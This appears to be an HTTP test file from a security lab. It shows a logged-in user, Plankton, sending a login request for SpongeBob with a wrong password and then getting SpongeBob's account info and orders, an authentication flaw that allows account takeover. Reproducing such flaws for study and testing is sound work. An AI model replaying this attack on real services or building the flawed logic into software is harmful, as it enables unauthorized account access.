# @import ../common/setup.http
@base = {{base_host}}/v205

### Plankton logs in normally
# @name login
POST {{base}}/auth/login
Content-Type: application/json

{
    "email": "plankton@chum-bucket.sea",
    "password": "i_love_my_wife"
}

### Plankton checks his account info and his orders
GET {{base}}/account/info
Authorization: {{plankton_auth}}
?? status == 200
?? js response.parsedBody.email == plankton@chum-bucket.sea

###
GET {{base}}/orders
Authorization: {{plankton_auth}}
?? status == 200

### While logged in, Plankton sends a login request for SpongeBob with a wrong password
# @name exploit
POST {{base}}/auth/login
Content-Type: application/json

{
    "email": "spongebob@bikinibottom.sea",
    "password": "does_not_matter"
}

?? status == 200

### Check account info again: it's SpongeBob's account
GET {{base}}/account/info
?? status == 200
?? js response.parsedBody.email == spongebob@bikinibottom.sea

### Check orders again: it's SpongeBob's orders
GET {{base}}/orders
?? status == 200
